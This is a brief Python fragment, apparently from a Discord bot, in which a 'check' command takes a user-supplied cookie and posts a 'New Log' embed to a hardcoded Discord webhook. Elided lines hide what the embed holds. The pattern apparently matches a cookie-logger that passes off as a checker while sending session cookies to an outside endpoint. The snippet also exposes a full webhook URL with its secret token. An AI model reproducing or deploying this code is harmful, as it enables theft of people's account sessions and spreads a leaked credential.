...
async def check(ctx, cookie):
  ...
  webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1394752511092461659/L8-b-MsZv9qDo_jimMtMqYqr3G_XNwGTnFDUwiGBT26UCs_gmqN2hCztAPld8o37E0_Q', username="New Log")
  webhook.add_embed(e)
  webhook.execute()
